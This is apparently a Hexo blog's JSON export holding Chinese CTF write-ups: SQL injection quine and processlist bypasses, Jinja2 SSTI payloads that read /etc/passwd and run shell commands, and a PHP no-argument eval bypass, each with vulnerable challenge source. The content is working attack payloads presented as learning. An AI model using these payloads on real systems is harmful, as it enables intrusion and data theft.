{"meta":{"title":"scr1pt_k1ddi3' blog","subtitle":"","description":"","author":"scr1pt_k1ddi3","url":"https://scr1pt-k1ddi3.github.io","root":"/"},"pages":[{"title":"about","date":"2022-04-13T10:12:53.000Z","updated":"2022-04-18T15:55:34.050Z","comments":true,"path":"about.html","permalink":"https://scr1pt-k1ddi3.github.io/about.html","excerpt":"","text":"💻 关于博客本站纯属瞎胡闹搞的，请各位客官不要轻信❤️：😃 关于我😎 个人简介本人是一只小傻鸟🐣🐥🐤，大菜狗🐶，还请各位客官多多包含,多多指教🙏🙏🙏。😷参悟真谛：佛曰：俱以豆皤想呐不薩缽多礙顛奢那皤死冥爍悉究侄特皤苦倒老咒侄真盡苦呐遠奢遮吉皤瑟冥特依哆數穆咒利俱爍"},{"title":"文章归档","date":"2022-04-13T14:16:19.393Z","updated":"2022-04-13T13:25:15.839Z","comments":true,"path":"archive.html","permalink":"https://scr1pt-k1ddi3.github.io/archive.html","excerpt":"","text":""},{"title":"friends","date":"2022-04-18T14:51:39.000Z","updated":"2022-04-18T15:50:53.074Z","comments":true,"path":"PY.html","permalink":"https://scr1pt-k1ddi3.github.io/PY.html","excerpt":"","text":"你我弟兄，辈子弟兄。其他弟兄，都是冒充！ 💪😎 scr1pt_k1ddi3’弟兄❤️❤️❤️"},{"title":"categories","date":"2022-04-13T10:54:10.000Z","updated":"2022-04-13T13:20:09.026Z","comments":true,"path":"categories/index.html","permalink":"https://scr1pt-k1ddi3.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"yet_another_mysql_injection-and-NISACTF2022-hardsql","slug":"yet_another_mysql_injection-and-NISACTF2022-hardsql","date":"2022-05-18T12:39:37.000Z","updated":"2022-05-18T13:15:18.233Z","comments":true,"path":"2022/05/18/yet_another_mysql_injection-and-NISACTF2022-hardsql/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2022/05/18/yet_another_mysql_injection-and-NISACTF2022-hardsql/","excerpt":"","text":"yet_another_mysql_injection：&lt;?php include_once(&quot;lib.php&quot;); function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href=&#39;&#123;$url&#125;&#39;;&lt;/script&gt;&quot;); &#125; function checkSql($s) &#123; if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123; alertMes(&#39;hacker&#39;, &#39;index.php&#39;); &#125; &#125; if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] != &#39;&#39; &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;password&#39;] != &#39;&#39;) &#123; $username=$_POST[&#39;username&#39;]; $password=$_POST[&#39;password&#39;]; if ($username !== &#39;admin&#39;) &#123; alertMes(&#39;only admin can login&#39;, &#39;index.php&#39;); &#125; checkSql($password); $sql=&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;$password&#39;;&quot;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&quot;something wrong&quot;,&#39;index.php&#39;); &#125; if ($row[&#39;password&#39;] === $password) &#123; die($FLAG); &#125; else &#123; alertMes(&quot;wrong password&quot;,&#39;index.php&#39;); &#125; &#125; if(isset($_GET[&#39;source&#39;]))&#123; show_source(__FILE__); die; &#125; ?&gt; hardsql:&lt;?php //多加了亿点点过滤 include_once(&quot;config.php&quot;); function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href=&#39;&#123;$url&#125;&#39;;&lt;/script&gt;&quot;); &#125; function checkSql($s) &#123; if(preg_match(&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\\\\$|char|\\x0a|\\x09|column|sleep|\\ /i&quot;,$s))&#123; alertMes(&#39;waf here&#39;, &#39;index.php&#39;); &#125; &#125; if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] != &#39;&#39; &amp;&amp; isset($_POST[&#39;passwd&#39;]) &amp;&amp; $_POST[&#39;passwd&#39;] != &#39;&#39;) &#123; $username=$_POST[&#39;username&#39;]; $password=$_POST[&#39;passwd&#39;]; if ($username !== &#39;bilala&#39;) &#123; alertMes(&#39;only bilala can login&#39;, &#39;index.php&#39;); &#125; checkSql($password); $sql=&quot;SELECT passwd FROM users WHERE username=&#39;bilala&#39; and passwd=&#39;$password&#39;;&quot;; $user_result=mysqli_query($MysqlLink,$sql); $row = mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&#39;nothing found&#39;,&#39;index.php&#39;); &#125; if ($row[&#39;passwd&#39;] === $password) &#123; if($password == &#39;b2f2d15b3ae082ca29697d8dcd420fd7&#39;)&#123; show_source(__FILE__); die; &#125; else&#123; die($FLAG); &#125; &#125; else &#123; alertMes(&quot;wrong password&quot;,&#39;index.php&#39;); &#125; &#125; ?&gt; 两种解法：quine：这个quine是我花了不少时间才真正搞懂的。 这里发现了一个分析的很好的文章：第五空间智能安全大赛-CTF-Web-yet_another_mysql_injection_m0_53065491的博客-程序员宝宝 - 程序员宝宝 (cxybb.com) 1.首先先了解一下replace()函数 replace(object,search,replace) 把object对象中出现的的search全部替换成replace 看个例子 select replace(&quot;.&quot;,char(46),&quot;.&quot;);# char(46)就是. +---------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------+ | . | +---------------------------+ 2.如何让输入输出一致呢？上面的例子用.替换object里的.，最终返回了一个.，那如果我们将object写成replace(&quot;.&quot;,char(46),&quot;.&quot;)会有什么变化呢？ mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;); +---------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;) | +---------------------------------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------------------------------+ 结果返回了replace(&quot;.&quot;,char(46),&quot;.&quot;)这个东西，但还是没有达到我们预期的效果怎么办，这时候我们将第三个参数也改成replace(&quot;.&quot;,char(46),&quot;.&quot;) mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); +---------------------------------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) | +---------------------------------------------------------------------------+ | replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) | +---------------------------------------------------------------------------+ 有点类似套娃的感觉。先分析一下这段sql语句 select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); replace函数的三个参数分别是 &#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39; char(46) &#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39; 这个语句的意思是用第三个参数替换第一个参数里面的.并返回替换后的第一个参数 这样就明白了为什么返回的是replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) 那么这样是否就达到了我们输入输出一致的目的呢，答案肯定是还没有。细心点就会发现输入与输出在单双引号上有细微的不同 3.解决单双引号不同的问题有了上面的经验后，我们这样考虑，如果先将双引号替换成单引号是不是就可以解决引号不同的问题了。实现方法无非就是在套一层replace mysql&gt; select replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;);# 先执行内层replace +--------------------------------------------------------+ | replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;) | +--------------------------------------------------------+ | &#39;.&#39; | +--------------------------------------------------------+ 1 row in set (0.00 sec) 这样就可以将我们的双引号替换成单引号，此时我们继续沿用上面的思路，构造输入输出相同的语句 mysql&gt; select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) 开始分析： replace(&quot;.&quot;,char(46),&quot;.&quot;);这个没什么好说的 mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;); +---------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;) | +---------------------------------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------------------------------+ 1 row in set (0.00 sec) 这一句就之所以会返回这个结果是因为**&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;是一个要被替换的字符串，所以它是不会被执行的！！！**这个看似很愚蠢的问题在于后面当字符串多起来时就不容易发现了！！！ mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); +---------------------------------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;) | +---------------------------------------------------------------------------+ | replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) | +---------------------------------------------------------------------------+ 1 row in set (0.00 sec) replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) 这里返回的结果看起来很像但是是不一样的，查询是双引号，返回是单引号。所以思路就是replace将双引号替换为单引号。 mysql&gt; select replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;); +--------------------------------------------------------+ | replace(replace(&#39;&quot;.&quot;&#39;,char(34),char(39)),char(46),&quot;.&quot;) | +--------------------------------------------------------+ | &#39;.&#39; | +--------------------------------------------------------+ 1 row in set (0.00 sec) 这里面是将”.”换为’.’，然后又将’.’中的.换了一次一样的. 其实这时返回了单引号就是已经将双引号换成了单引号，而后面的第二次替换在这里看似没什么，但是其实后面是用来构造语句的相等的。 mysql&gt; select replace(replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&quot;.&quot;); +------------------------------------------------------------------------------+ | replace(replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&quot;.&quot;) | +------------------------------------------------------------------------------+ | replace(&#39;.&#39;,char(46),&#39;.&#39;) | +------------------------------------------------------------------------------+ 1 row in set (0.00 sec) 对应这上面 mysql&gt; select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;); +---------------------------------------------------+ | replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;.&#39;) | +---------------------------------------------------+ | replace(&quot;.&quot;,char(46),&quot;.&quot;) | +---------------------------------------------------+ 1 row in set (0.00 sec) 这时可以看到返回的结果就是单引号，所以按照上面的思路，只要加上双引号向单引号的替换就是quine了。 mysql&gt; select replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) 经过两次替换成功quine。一次双引号向单引号的替换，一次是构造相等的替换，但是传递的参数中第一个和第三个参数都有replace。 replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); 分析：第一次：replace(‘replace(replace(“.”,char(34),char(39)),char(46),”.”)’,char(34),char(39)) 返回replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)然后再次执行外层replace，是在现在这条上换的， .换成后面的参数， replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;) 成功quine。 Quine基本形式：replace(replace(&#39;str&#39;,char(34),char(39)),char(46),&#39;str&#39;) 先将str里的双引号替换成单引号，再用str替换str里的**.** str基本形式（可以理解成上面的**&quot;.&quot;**） replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;) 完整的Quine就是Quine基本形式+str基本形式 然后构造payload,其实就是换str，str要闭合前面的sql语句， &#39;/**/union/**/select(REPLACE(REPLACE(&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#39;,CHAR(34),CHAR(39)),CHAR(33),&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#39;))# 原理同上。 注意绕过：绕过时可以使用char()函数，但是hardsql中char函数被禁，可以用十六进制绕过，如： &#39;union/**/SELECT/**/REPLACE(REPLACE(&#39;&quot;union/**/SELECT/**/REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;)/**/AS/**/E#&#39;,0x22,0x27),0x21,&#39;&quot;union/**/SELECT/**/REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;)/**/AS/**/E#&#39;)/**/AS/**/E# &#39;/**/union/**/select(REPLACE(REPLACE(&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;))#&#39;,0x22,0x27),0x21,&#39;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,0x22,0x27),0x21,&quot;!&quot;))#&#39;))# PROCESSLIST：这是NU1L战队的payload，利用的是processlist表， performance_schema.threads表中的PROCESSLIST_INFO会记录线程正在执行的完整语句 先贴payload然后慢慢分析： SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t# 这里面首先是performance_schema.threads表的介绍，performance_schema.threads表中的PROCESSLIST_INFO会记录线程正在执行的完整语句: 可以看到这里面会记录着查询的语句，是PROCESSLIST_INFO字段，然后就是如何去从中定位到最后的这个语句，where/**/name/**/like&#39;%connection%&#39;/就是通过正则表达式的方式去找到的 可以看到这样就是找到了语句，然后就是获取PROCESSLIST_INFO字段，本来是直接select就行，但是由于这里in被过滤，所以直接查表名是不行了，所以用的是无列名注入， select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t# 这里面select `11`是因为PROCESSLIST_INFO是第十一个字段， mid(`11`,65,217)则是截取查询语句用的，SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;一共是64，后面截取到217，所以查出来的可以等于password输入的。 mysql&gt; select mid(&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t#&quot;,65,217); +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | mid(&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%c | +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | 1&#39;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;/**/limit/**/1,1)t# | +------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) 但是PROCESSLIST使用是有条件的， mysql&gt; select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/name/**/like&#39;%connection%&#39;; +----+---------------------------+------------+------+------+-----------+------+-------+------+--------------+-------------------------------------------------------------------------------------------------------------------------------+------+------+-----+-----+--------+-------+ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | +----+---------------------------+------------+------+------+-----------+------+-------+------+--------------+-------------------------------------------------------------------------------------------------------------------------------+------+------+-----+-----+--------+-------+ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | | 31 | thread/sql/one_connection | FOREGROUND | 5 | root | localhost | zzc | Query | 0 | Sending data | select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 union select * from performance_schema.threads where name like&#39;%connection%&#39; | NULL | NULL | YES | YES | TCP/IP | 30380 | +----+---------------------------+------------+------+------+-----------+------+-------+------+--------------+-------------------------------------------------------------------------------------------------------------------------------+------+------+-----+-----+--------+-------+ 可以看出，当开启使用时limit 1,1才能查出下面一行的数据，关闭时只有上面的数字。hardsql中就关闭了processlist表。所以只能用quine。 并且mysql和mariadb的processlist列数是不一样的，一个14，一个17. 第三届第五空间网络安全大赛-选拔赛-部分Writeup_末初 · mochu7-程序员宝宝 - 程序员宝宝 (cxybb.com)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"},{"name":"write up","slug":"CTF/write-up","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"}]},{"title":"pwnhub-TemplatePlay","slug":"pwnhub-TemplatePlay","date":"2022-05-17T16:08:39.000Z","updated":"2022-05-17T16:24:29.931Z","comments":true,"path":"2022/05/18/pwnhub-TemplatePlay/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2022/05/18/pwnhub-TemplatePlay/","excerpt":"","text":"解题过程进去发现注入点： 经过长久的尝试，发现过滤似乎是过滤了[]. &quot;&quot;. &#39;&#39;. (). |等，所以只能是拿了一个不存在的函数去构造， 这是我写的payload： config: &#123;&#123;t.__class__.__base__.__subclasses__()[280].__init__.__globals__['current_app'].config&#125;&#125; 文件读取： &#123;&#123;t.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125; 写文件： &#123;&#123;t.__class__.__base__.__subclasses__()[40]('1.sh','w').write(\"echo+'Hello,World!'\")&#125;&#125; &#123;&#123;t.__class__.__base__.__subclasses__()[40]('1.sh','a').write(\"echo+'Hello,World!'\")&#125;&#125; 命令执行： &#123;&#123;t.__class__.__base__.__subclasses__()[261](\"ls+/\",shell=True,stdout=-1).communicate()[0]&#125;&#125; &#123;&#123;t.__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls+/').read()&#125;&#125; 但是我的payload无法读到二级目录，很奇怪，后来才知道是因为payload被限制了长度。 读一下源码： 过滤条件： string = request.values.get(&quot;string&quot;) patter1 = re.compile(r&quot;\\&#123;\\&#123;[a-z]?_[a-z]?\\.|[a-z]?\\&quot;[a-z]*\\.|[a-z]?\\(.?\\)\\.|[a-z]?\\[.?\\]\\.|[a-z]?\\&#39;[a-z]?\\.|\\|&quot;) unsafe_string = patter1.findall(string) if unsafe_string: return render_template_string(&#39;&#39;&#39;&lt;p&gt;hello hacker&lt;/p&gt;&#39;&#39;&#39;) exit(0) patter = re.compile(r&quot;\\&#123;\\&#123;[a-z]&#123;1,4&#125;\\..*|\\&#123;\\&#123;[0-9\\*\\+-]&#123;1,10&#125;\\&#125;\\&#125;|[0-9a-z]*&quot;) template_str = patter.findall(string, 0, 100) if template_str[0] == &quot;&quot;: return render_template_string(&#39;&#39;&#39;&lt;p&gt;You input string unavailable&lt;/p&gt;&#39;&#39;&#39;) exit(0) 第一个正则是前面的过滤，后面的就有些离谱： 如果是字母，那么就是.之前不能超过四个字母，纯数字不能超过10位。并截取前100，所以payload字符串超过100就返回500的原因。。。 最终payload： &#123;&#123;ads.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"cat+/www/config/flag.txt\").read()&#125;&#125; 这就是ads是不存在的，ads.__init__是undefind类，调用undefind类__globals__下的__builtins__然后import os。 这个payload比较短，所以执行的命令就多。。。 这条payload看来也算是jinjia2 SSTI里的万能payload了 不过学长后来改过我的payload后也能读，TQL,ORZ！！！ ?string=&#123;&#123;u.__class__.__base__.__subclasses__()[261](%22ls%20/www/*%22,shell=True,stdout=-1).communicate()[0]&#125;&#125; ?string=&#123;&#123;u.__class__.__base__.__subclasses__()[261](%22cat%20/*/*/flag*%22,shell=1,stdout=-1).communicate()&#125;&#125; 反正就是只要知道了目录就好说了。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"},{"name":"write up","slug":"CTF/write-up","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"}]},{"title":"ichunqiu-Mercy-code","slug":"ichunqiu-Mercy-code","date":"2022-05-08T09:52:18.000Z","updated":"2022-05-08T10:51:08.502Z","comments":true,"path":"2022/05/08/ichunqiu-Mercy-code/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2022/05/08/ichunqiu-Mercy-code/","excerpt":"","text":"源码：&lt;?php highlight_file(__FILE__); if ($_POST[&#39;cmd&#39;]) &#123; $cmd = $_POST[&#39;cmd&#39;]; if (&#39;;&#39; === preg_replace(&#39;/[a-z_]+\\((?R)?\\)/&#39;, &#39;&#39;, $cmd)) &#123; if (preg_match(&#39;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#39;, $cmd)) &#123; die(&#39;What are you thinking?&#39;); &#125; else &#123; eval($cmd); &#125; &#125; else &#123; die(&#39;Please calm down&#39;); &#125; &#125; 思路这个题就是[GXYCTF2019]禁止套娃的改编版本，&#39;;&#39; === preg_replace(&#39;/[a-z_]+\\((?R)?\\)/&#39;, &#39;&#39;, $cmd的意思就是只能是无参数函数，恶心一点的是这里加了亿点点过滤，啥玩意都过滤了，环境关了，就从本地实验吧。 从网上找到几篇比较好的无参rce： php rce之无参数读文件 - FreeBuf网络安全行业门户 (55条消息) php无参数函数实现rce,无参数读文件和RCE总结_春雪芳菲的博客-CSDN博客 原始的那些payload都不管用，这里主要就是想办法构造.,主要影响的过滤就是 array、localeconv、phpversion、et、nt、sqrt、ord、time反正就是都过滤了个差不多了。不过我找到了一个payload： print_r(scandir(chr(ord(hebrevc(crypt(time())))))); 解释：crypt()返回使用 DES、Blowfish 或 MD5 算法加密的字符串。 hebrevc() 函数把希伯来文本从右至左的流转换为左至右的流。同时，把新行（\\n）转换为 hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 “.”(小概率) 然后通过chr(ord())只取第一个字符&#x2F; ord()返回字符串中第一个字符的Ascii值。 实验过程： 可以看出来，hebrevc()、crypt()这两个函数是没有过滤的，time()这个函数就是返回一个数，换一个就行，随便从数学函数找一个就行， 比如：sin()，如图： 效果一样。 关键问题是ord()函数被过滤了，这就是一个比较严重的问题，不过我们只要找到一个函数返回一个字符串的第一个字符就行。 我找到了这个函数，str_split() 函数，解释： str_split() 函数把字符串分割到数组中。 语法 str_split(string,length) 参数 描述 string 必需。规定要分割的字符串。 length 可选。规定每个数组元素的长度。默认是 1。 注意： length 可选。规定每个数组元素的长度。默认是 1。 所以就试试，因为我们就是要返回第一个.,结果： 返回了数组有一大堆东西。。。 想办法找第一个并输出就行，我们注意到虽然过滤了array，但是next(),prev()等函数并没有过滤，所以我们只要将指针指向数组第一个值就行，我这里选的是next()和each()搭配，瞎试出来的。。。 这里each() 函数返回当前元素的键名和键值，并将内部指针向前移动。然后next()函数再向后移动一下，正好回去并且输出。这不就构造出来了吗😁 多试几次就会返回.，结果如图： 再加scandir()，成功返回： 但是题目中print_r()和var_dump()都被过滤，数组输出不出来，所以就只能用echo()猜位置，题目中猜最后一个正好是flag，就直接加个end()函数读就完了。 payload： cmd=show_source(end(scandir(next(each(str_split(hebrevc(crypt(sin())))))))); 不过好像如果文件不在最后一个而是在中间，那么由于过滤了array，好像就不太好读了。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"},{"name":"rce","slug":"rce","permalink":"https://scr1pt-k1ddi3.github.io/tags/rce/"}]},{"title":"hello world","slug":"hello-world","date":"2021-04-08T06:45:37.000Z","updated":"2022-05-18T12:44:16.072Z","comments":true,"path":"2021/04/08/hello-world/","link":"","permalink":"https://scr1pt-k1ddi3.github.io/2021/04/08/hello-world/","excerpt":"","text":"Hello World👽!","categories":[{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/categories/hello/"}],"tags":[{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/tags/hello/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/"},{"name":"write up","slug":"CTF/write-up","permalink":"https://scr1pt-k1ddi3.github.io/categories/CTF/write-up/"},{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/categories/hello/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://scr1pt-k1ddi3.github.io/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://scr1pt-k1ddi3.github.io/tags/web/"},{"name":"rce","slug":"rce","permalink":"https://scr1pt-k1ddi3.github.io/tags/rce/"},{"name":"hello","slug":"hello","permalink":"https://scr1pt-k1ddi3.github.io/tags/hello/"}]}